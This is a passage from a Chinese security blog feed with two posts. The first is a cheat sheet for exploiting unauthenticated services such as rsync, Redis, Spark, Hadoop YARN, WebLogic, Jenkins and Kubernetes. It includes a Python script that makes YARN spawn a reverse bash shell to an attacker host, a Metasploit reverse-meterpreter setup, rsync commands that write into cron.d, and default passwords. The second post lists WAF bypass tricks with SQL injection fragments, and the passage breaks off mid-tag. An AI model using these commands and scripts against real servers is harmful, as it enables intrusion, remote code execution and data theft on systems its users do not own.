    <content type="html"><![CDATA[<p>未授权漏洞利用</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>未作限制，普通用户能垂直越权什么的</p><p>未授权访问，在不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证存在缺陷、无认证或安全配置不当导致。常见于服务端口，接口未限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。</p><h2 id="FTP-未授权访问"><a href="#FTP-未授权访问" class="headerlink" title="FTP 未授权访问"></a>FTP 未授权访问</h2><ul><li><p>端口：21</p></li><li><p>介绍：FTP服务端配置anymouns 可登录，则可直接使用user为anymouns，不输入密码直接可登录到FTP</p></li><li><p>漏洞利用：直接访问ftp路径：<a href="ftp://ip:port/，或终端登录，输入user为anymouns">ftp://ip:port/，或终端登录，输入user为anymouns</a></p></li></ul><h2 id="LDAP-未授权访问"><a href="#LDAP-未授权访问" class="headerlink" title="LDAP 未授权访问"></a>LDAP 未授权访问</h2><ul><li><p>端口：389</p></li><li><p>介绍：LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问，<strong>存储和查询 “目录型数据” 的网络协议</strong></p></li><li><p>漏洞利用：<a href="https://ldapbrowserwindows.com/">工具</a>连接</p></li></ul><h2 id="rsync-未授权访问"><a href="#rsync-未授权访问" class="headerlink" title="rsync 未授权访问"></a>rsync 未授权访问</h2><ul><li><p>端口：873</p></li><li><p>介绍：rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件</p></li><li><p>漏洞利用：<a href="https://vulhub.org/#/environments/rsync/common/">https://vulhub.org/#/environments/rsync/common/</a></p></li><li><p><code>rsync rsync://your-ip:873/src/</code> 列出目录</p></li><li><p><code>rsync -av rsync://your-ip:873/src/etc/passwd ./</code> 下载文件</p></li><li><p><code>rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell</code> 上传文件</p></li></ul><h2 id="ZooKeeper-未授权访问"><a href="#ZooKeeper-未授权访问" class="headerlink" title="ZooKeeper 未授权访问"></a>ZooKeeper 未授权访问</h2><ul><li><p>端口：2181</p></li><li><p>介绍：ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。</p></li><li><p>漏洞利用：</p></li><li><p><code>echo envi| nc xxx.xxx.xxx.xxx 2181</code> 获取服务器环境信息</p></li><li><p><code>echo stat | nc 192.168.131.128 2181</code></p></li></ul><h2 id="Docker-未授权访问"><a href="#Docker-未授权访问" class="headerlink" title="Docker 未授权访问"></a>Docker 未授权访问</h2><ul><li><p>端口：2375</p></li><li><p>介绍：Docker API可以执行Docker命令，在未授权的情况下可以执行docker命令</p></li><li><p>漏洞利用：<a href="https://vulhub.org/#/environments/docker/unauthorized-rce/">https://vulhub.org/#/environments/docker/unauthorized-rce/</a></p></li></ul><h2 id="Docker-Registry-未授权访问"><a href="#Docker-Registry-未授权访问" class="headerlink" title="Docker Registry 未授权访问"></a>Docker Registry 未授权访问</h2><ul><li><p>端口：5000</p></li><li><p>介绍：docker remote api可以执行docker命令</p></li><li><p>漏洞利用：</p></li><li><p><code>curl -k -XGET https://xxx.xxx.xxxx/v2/_catalog</code> 查询catalog</p></li><li><p><code>curl -k -XGET https://xxx.xxx.xxx/v2/&lt;image&gt;/tags/list</code>查询tags</p></li></ul><h2 id="Kibana-未授权访问"><a href="#Kibana-未授权访问" class="headerlink" title="Kibana 未授权访问"></a>Kibana 未授权访问</h2><ul><li><p>端口: 5001</p></li><li><p>介绍：Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成数据泄露。</p></li><li><p>漏洞利用：</p></li><li><p>直接访问kibana的页面</p></li></ul><h2 id="VNC未授权访问"><a href="#VNC未授权访问" class="headerlink" title="VNC未授权访问"></a>VNC未授权访问</h2><ul><li><p>端口：5900, 5901</p></li><li><p>介绍：VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重</p></li><li><p>漏洞利用：下载<a href="https://www.realvnc.com/en/connect/download/viewer/">VNC® Viewer</a>，并连接，这个要结合其他漏洞利用，不然还是挺难利用的</p></li></ul><h2 id="CouchDB-未授权访问"><a href="#CouchDB-未授权访问" class="headerlink" title="CouchDB 未授权访问"></a>CouchDB 未授权访问</h2><ul><li><p>端口：5984</p></li><li><p>介绍：Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p></li><li><p>漏洞利用：<code>curl xxx.xxx.xxx.xxx:5984/_config</code></p></li></ul><h2 id="Apache-Spark-未授权访问"><a href="#Apache-Spark-未授权访问" class="headerlink" title="Apache Spark 未授权访问"></a>Apache Spark 未授权访问</h2><ul><li><p>端口：6066, 8081,8082</p></li><li><p>介绍：Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。</p></li><li><p>漏洞利用：使用msf工具getshell</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;use exploit/linux/http/spark_unauth_rce</span><br><span class="line">msf5&gt;set payload java/meterpreter/reverse_tcp</span><br><span class="line">msf5&gt;set rhost xxx.xxxx.xxxx</span><br><span class="line">msf5&gt;set rport 6066</span><br><span class="line">msf5&gt;set lhost xxx.xxx.xxx.xxx</span><br><span class="line">msf5&gt;set lport 4444</span><br><span class="line">msf5&gt;set srvhost xxx.xxx.xxx.xxx</span><br><span class="line">msf5&gt;set srvport 8080</span><br><span class="line">msf5&gt;exploit</span><br></pre></td></tr></table></figure><h2 id="Redis-未授权访问"><a href="#Redis-未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问</h2><ul><li><p>端口：6379</p></li><li><p>介绍：redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。  Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令</p></li><li><p>漏洞利用：redis-cli远程连接</p></li></ul><h2 id="Weblogic-未授权访问"><a href="#Weblogic-未授权访问" class="headerlink" title="Weblogic 未授权访问"></a>Weblogic 未授权访问</h2><ul><li><p>端口：7001</p></li><li><p>介绍：Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。<br>  CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p></li><li><p>漏洞利用：</p></li><li><p><code>http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252fconsole.portal</code>进入后台</p></li></ul><h2 id="Hadoop-YARN-未授权访问"><a href="#Hadoop-YARN-未授权访问" class="headerlink" title="Hadoop YARN 未授权访问"></a>Hadoop YARN 未授权访问</h2><ul><li><p>端口：8088</p></li><li><p>介绍：Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。</p></li><li><p>漏洞利用</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import requests</span><br><span class="line">target = &#x27;http://xxx.xxx.xxx.xxx:8088/&#x27; # 设置目标主机的ip地址</span><br><span class="line">lhost = &#x27;xxx.xxx.xxx.xxx&#x27; # 设置你攻击主机的监听ip地址，并且监听端口为9999</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;application-id&#x27;: app_id,</span><br><span class="line">    &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">    &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">        &#x27;commands&#x27;: &#123;</span><br><span class="line">            &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure><h2 id="JBoss-未授权访问"><a href="#JBoss-未授权访问" class="headerlink" title="JBoss 未授权访问"></a>JBoss 未授权访问</h2><ul><li><p>端口：8080</p></li><li><p>介绍：JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 <a href="http://ip:8080/jmx-console%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%B5%8F%E8%A7%88">http://ip:8080/jmx-console，就可以浏览</a> Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p></li><li><p>漏洞利用：</p></li><li><p>同tomcat manager</p></li></ul><h2 id="Jenkins-未授权访问"><a href="#Jenkins-未授权访问" class="headerlink" title="Jenkins 未授权访问"></a>Jenkins 未授权访问</h2><ul><li><p>端口：8080</p></li><li><p>介绍：默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p></li><li><p>漏洞利用：未授权访问 <code>http://&lt;target&gt;:8080/script</code>，可以执行系统命令</p></li></ul><h2 id="Kubernetes-Api-Server-未授权"><a href="#Kubernetes-Api-Server-未授权" class="headerlink" title="Kubernetes Api Server 未授权"></a>Kubernetes Api Server 未授权</h2><ul><li><p>端口：8080,10250</p></li><li><p>介绍：Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。</p></li><li><p>漏洞利用：</p></li><li><p><code>http://xxx.xxx.xxx.xxx:8080/</code> 可以看到路由信息</p></li><li><p>10250端口是kubelet API的HTTPS端口，通过路径:<code>https://xxx.xxx.xxx.xxx/10250/pods</code>获取环境变量、运行的容器信息、命名空间等信息</p></li></ul><h2 id="Active-MQ-未授权访问"><a href="#Active-MQ-未授权访问" class="headerlink" title="Active MQ 未授权访问"></a>Active MQ 未授权访问</h2><ul><li><p>端口：8161</p></li><li><p>介绍：ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p></li><li><p>漏洞利用：</p></li><li><p>默认口令：admin&#x2F;admin</p></li></ul><h2 id="Jupyter-Notebook-未授权访问"><a href="#Jupyter-Notebook-未授权访问" class="headerlink" title="Jupyter Notebook 未授权访问"></a>Jupyter Notebook 未授权访问</h2><ul><li><p>端口：8888</p></li><li><p>介绍：Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p></li><li><p>漏洞利用：</p></li><li><p>访问<code>http://xxx.xxx.xxx.xxx:8888</code>，将看到Jupyter Notebook的Web管理界面，并没有要求填写密码</p></li><li><p>选择 new -&gt; terminal 即可创建一个控制台</p></li><li><p>直接执行任意命令</p></li></ul><h2 id="Elasticsearch-未授权访问"><a href="#Elasticsearch-未授权访问" class="headerlink" title="Elasticsearch 未授权访问"></a>Elasticsearch 未授权访问</h2><ul><li><p>端口：9200,9300</p></li><li><p>介绍：Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。</p></li><li><p>漏洞利用：</p></li><li><p>直接访问<code>http://xxx.xxx.xxx.xxx:9200</code></p></li><li><p><code>_cat/indices</code></p></li><li><p><code>_river/_search</code> 数据库信息</p></li><li><p><code>_nodes</code> 节点信息</p></li><li><p><code>_plugin/head</code> （有head插件的情况下）</p></li></ul><h2 id="Zabbix-未授权访问"><a href="#Zabbix-未授权访问" class="headerlink" title="Zabbix 未授权访问"></a>Zabbix 未授权访问</h2><ul><li><p>端口：10051</p></li><li><p>介绍：zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p></li><li><p>漏洞利用</p></li><li><p>无需账户密码直接访问zabbix页面</p></li></ul><h2 id="RabbitMQ-未授权访问"><a href="#RabbitMQ-未授权访问" class="headerlink" title="RabbitMQ 未授权访问"></a>RabbitMQ 未授权访问</h2><ul><li><p>端口：15672,15692,25672</p></li><li><p>介绍：RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。</p></li><li><p>漏洞利用：</p></li><li><p>默认账号密码都是guest</p></li></ul><h2 id="MongoDB-未授权访问"><a href="#MongoDB-未授权访问" class="headerlink" title="MongoDB 未授权访问"></a>MongoDB 未授权访问</h2><ul><li><p>端口：27017</p></li><li><p>介绍：开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p></li><li><p>漏洞利用：</p></li><li><p>使用数据库连接工具 如navicat 等直接连接</p></li></ul><h2 id="NFS-未授权访问"><a href="#NFS-未授权访问" class="headerlink" title="NFS 未授权访问"></a>NFS 未授权访问</h2><ul><li><p>端口：2049，20048</p></li><li><p>介绍：NetworkFileSystem(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏</p></li><li><p>漏洞利用：</p></li><li><p>安装nfs客户端 <code>nfs-common</code></p></li><li><p>查看nfs服务器上的共享目录 <code>showmount -e xxx.xxx.xxx.xxx</code></p></li><li><p>挂载相应共享目录到本地 <code>mount -t nfs xxx.xxx.xxx.xxx:/grdata /mnt</code></p></li></ul><h2 id="Dubbo-未授权访问"><a href="#Dubbo-未授权访问" class="headerlink" title="Dubbo 未授权访问"></a>Dubbo 未授权访问</h2><ul><li><p>端口：28096</p></li><li><p>介绍：Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞</p></li><li><p>漏洞利用：<code>telnet ip port</code></p></li></ul><h2 id="Druid-未授权访问"><a href="#Druid-未授权访问" class="headerlink" title="Druid 未授权访问"></a>Druid 未授权访问</h2><ul><li><p>端口：&#x2F;</p></li><li><p>介绍：Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问</p></li><li><p>漏洞利用：</p></li><li><p>&#x2F;druid&#x2F;index.html</p></li><li><p>&#x2F;druid&#x2F;websession.html</p></li><li><p>&#x2F;druid&#x2F;datasource.html</p></li><li><p>&#x2F;druid&#x2F;sql.html</p></li><li><p>&#x2F;druid&#x2F;spring.html</p></li></ul><h2 id="Solr-未授权访问"><a href="#Solr-未授权访问" class="headerlink" title="Solr 未授权访问"></a>Solr 未授权访问</h2><ul><li><p>端口：443,8443</p></li><li><p>介绍：Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell</p></li><li><p>漏洞利用</p></li><li><p>&#x2F;solr&#x2F;admin</p></li></ul><h2 id="SpringBoot-Actuator-未授权访问"><a href="#SpringBoot-Actuator-未授权访问" class="headerlink" title="SpringBoot Actuator 未授权访问"></a>SpringBoot Actuator 未授权访问</h2><ul><li><p>端口：&#x2F;</p></li><li><p>介绍：Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。</p></li><li><p>漏洞利用：</p></li><li><p>&#x2F;actuator&#x2F;autoconfig</p></li><li><p>&#x2F;actuator&#x2F;env</p></li><li><p>&#x2F;actuator&#x2F;dump</p></li><li><p>&#x2F;actuator&#x2F;headdump 可下载</p></li></ul><h2 id="SwaggerUI未授权访问漏洞"><a href="#SwaggerUI未授权访问漏洞" class="headerlink" title="SwaggerUI未授权访问漏洞"></a>SwaggerUI未授权访问漏洞</h2><ul><li><p>端口：&#x2F;</p></li><li><p>介绍：Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。</p></li><li><p>漏洞利用：</p></li><li><p>swagger-ui未直接部在IP根目录下</p></li><li><p>直接访问</p></li></ul><h2 id="Harbor未授权添加管理员漏洞"><a href="#Harbor未授权添加管理员漏洞" class="headerlink" title="Harbor未授权添加管理员漏洞"></a>Harbor未授权添加管理员漏洞</h2><ul><li><p>端口：&#x2F;</p></li><li><p>介绍：Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从而接管Harbor镜像仓库</p></li><li><p>漏洞利用：</p></li><li><p>&#x2F;harbor&#x2F;sign-in</p></li><li><p>注册管理员</p></li><li><p>像我们实验室的内部系统就是用的这个仓库，功能就是把docker打包的镜像传上去</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;未授权漏洞利用&lt;/p&gt;</summary>
    
    
    
    <category term="服务" scheme="https://flypigc.github.io/categories/%E6%9C%8D%E5%8A%A1/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>waf绕过手法</title>
    <link href="https://flypigc.github.io/2025/12/18/%E9%80%9A%E7%94%A8%E7%BB%95waf/"/>
    <id>https://flypigc.github.io/2025/12/18/%E9%80%9A%E7%94%A8%E7%BB%95waf/</id>
    <published>2025-12-18T14:13:57.492Z</published>
    <updated>2025-12-20T01:57:32.922Z</updated>
    
    <content type="html"><![CDATA[<p>waf绕过</p><p><a href="https://www.anquanke.com/post/id/212272">waf绕过拍了拍你-安全KER - 安全资讯平台</a></p><span id="more"></span><p>搭建雷池waf进行测试</p><p>在http协议层面对我们的数据包进行检测，如果发现了可能是带有攻击性的语句，就会进行拦截</p><h2 id="大小写绕"><a href="#大小写绕" class="headerlink" title="大小写绕"></a>大小写绕</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unIoN Select</span><br></pre></td></tr></table></figure><h2 id="双写绕"><a href="#双写绕" class="headerlink" title="双写绕"></a>双写绕</h2><p>关键词过滤替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ununionion ==&gt; 去掉union ==&gt; union</span><br></pre></td></tr></table></figure><h2 id="编码绕"><a href="#编码绕" class="headerlink" title="编码绕"></a>编码绕</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">URL编码：waf没识别，但后端自动解码URL编码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UNICODE   //JSON的Unicode转义，JSON 解析器（如 Java 的 Jackson、Python 的 `json` 模块、Go 的 `encoding/json`）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">十六进制编码</span><br><span class="line"></span><br><span class="line">其他后端会解析的编码</span><br></pre></td></tr></table></figure><table><thead><tr><th>编码类型</th><th>示例（以<code>or</code>为例）</th><th>后端解析方式</th></tr></thead><tbody><tr><td>Base64 编码</td><td><code>b3I=</code></td><td>Python：<code>base64.b64decode(&quot;b3I=&quot;).decode()</code></td></tr><tr><td>ASCII 十六进制（\x）</td><td><code>\x6f\x72</code></td><td>Python&#x2F;PHP 直接解析（如 Python<code>b&quot;\x6f\x72&quot;.decode()</code>）</td></tr><tr><td>双重 URL 编码</td><td><code>%256F%2572</code></td><td>后端多次解码（先解<code>%25</code>为<code>%</code>，再解<code>%6F%72</code>为<code>or</code>）</td></tr></tbody></table><h2 id="垃圾字符"><a href="#垃圾字符" class="headerlink" title="垃圾字符"></a>垃圾字符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /foo?sqli=111...80万个1...111&#x27;+and+2*3=6+--+ HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Host: Host</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure><p>WAF设置了过滤数据包长度，如果数据包过大直接不检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">application/x-www-form-urlencoded; charset=ibm037</span><br><span class="line">multipart/form-data; charset=ibm037, boundary=blah</span><br><span class="line">multipart/form-data; boundary=blah ; charset=ibm037</span><br></pre></td></tr></table></figure><p>修改编码绕过，大部分waf识别的是UTF8编码检测</p><h2 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h2><p>burp插件：<a href="https://github.com/c0ny1/chunked-coding-converter.git">https://github.com/c0ny1/chunked-coding-converter.git</a> 在头部加入 <code>Transfer-Encoding: chunked</code> 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766067216817-c915699d-0a3a-4313-91f2-91c3a8ec329b.jpg" alt="null"></p><h2 id="HTTP协议绕过"><a href="#HTTP协议绕过" class="headerlink" title="HTTP协议绕过"></a>HTTP协议绕过</h2><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP 0.9"></a>HTTP 0.9</h3><p>HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果，在header添加payload</p><h3 id="参数污染（HPP）"><a href="#参数污染（HPP）" class="headerlink" title="参数污染（HPP）"></a>参数污染（HPP）</h3><p>简单来说，存在多个同名参数的情况下，可能存在逻辑层和WAF层对参数的取值不同，即可能逻辑层使用的第一个参数，而WAF层使用的第二个参数，我们只需要第二个参数正常，在第一个参数插入payload，这样组合起来就可以绕过WAF，如下数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /foo?par=first&amp;par=last HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Host: Host</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure><ol><li><strong>部分中间件的处理方法：</strong></li></ol><table><thead><tr><th>Web环境</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP&#x2F;Apache</td><td>$_GET(“par”)</td><td>last</td></tr><tr><td>JSP&#x2F;Tomcat</td><td>Request.getParameter(“par”)</td><td>first</td></tr><tr><td>Perl(CGI)&#x2F;Apache</td><td>Param(“par”)</td><td>first</td></tr><tr><td>Python&#x2F;Apache</td><td>getvalue(“par”)</td><td>[“first”,”last”]</td></tr><tr><td>ASP.NET&#x2F;IIS</td><td>Request.QueryString(“par”)</td><td>first,last</td></tr></tbody></table><h3 id="Pipeline（keep-alive）"><a href="#Pipeline（keep-alive）" class="headerlink" title="Pipeline（keep-alive）"></a>Pipeline（keep-alive）</h3><p>http请求头部中有<code>Connection</code>这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成<code>keep-alive</code>，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束<code>Connection</code>为<code>close</code>为止 我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf</p><p>记得把brupsuite自动更新<code>Content-Length</code>的勾去掉<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766067216905-7fc67f8a-0863-4248-be29-2159755fb9b1.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line">a=1GET / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h3 id="HTTP-charset"><a href="#HTTP-charset" class="headerlink" title="HTTP charset"></a>HTTP charset</h3><p>利用<code>Content-Type: xxx;charset=xxx</code>编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">application/x-www-form-urlencoded; charset=ibm037</span><br><span class="line">multipart/form-data; charset=ibm037, boundary=blah</span><br><span class="line">multipart/form-data; boundary=blah ; charset=ibm037</span><br></pre></td></tr></table></figure><h2 id="WAF特性"><a href="#WAF特性" class="headerlink" title="WAF特性"></a>WAF特性</h2><h3 id="云WAF绕过"><a href="#云WAF绕过" class="headerlink" 